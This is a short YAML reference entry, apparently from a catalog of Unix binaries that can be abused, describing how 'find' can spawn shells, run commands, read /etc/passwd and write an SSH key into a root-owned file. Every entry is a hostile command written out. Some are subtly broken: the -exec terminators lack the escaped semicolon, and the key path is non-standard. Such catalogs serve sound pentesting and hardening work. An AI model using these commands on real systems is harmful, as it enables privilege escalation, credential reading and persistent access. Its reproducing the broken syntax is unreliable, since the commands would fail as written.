---
functions:
  shell:
    - description: Can be used to execute arbitrary commands on a system and spawn shells either indirectly
      code: |
        find . -name i_do_not_exist -or -exec perl -e 'exec sh' ; -quit
    - description: or directly.
      code: |
        find . -exec /bin/sh ; -quit
  command:
    - description: Can be used to execute arbitrary commands on a system.
      code: |
        find . -name i_do_not_exist -or -exec ls ; -quit
  file-read:
    - description: Reading of files is possible by executing cat.
      code: |
        find /etc/passwd -exec cat {} ;
  file-write:
    - description: Find has various capabilities to write to files and it is recommended to read the manual for more details, especially its fprintf and 'UNUSUAL FILENAMES' sections.
      code: |
        find . -fprintf /root/.authorized_keys 'ssh-rsa ...' -quit
---
